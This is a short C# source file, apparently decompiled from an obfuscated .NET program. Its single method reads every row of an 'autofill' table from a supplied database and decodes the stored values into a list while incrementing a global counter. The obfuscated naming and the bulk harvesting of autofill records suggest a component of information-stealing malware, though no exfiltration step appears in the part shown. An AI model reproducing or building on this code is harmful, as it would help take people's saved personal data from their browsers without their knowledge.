using System.Collections.Generic;

internal sealed class Class79
{
	public static List<Struct2> smethod_0(string string_0)
	{
		List<Struct2> list = new List<Struct2>();
		try
		{
			Class54 @class = Class55.smethod_0(string_0, "autofill");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct2 item = default(Struct2);
				item.string_0 = Class87.smethod_2(@class.method_0(i, 1));
				item.string_1 = Class87.smethod_2(Class87.smethod_4(string_0, @class.method_0(i, 2)));
				Class36.int_2++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return list;
		}
	}
}
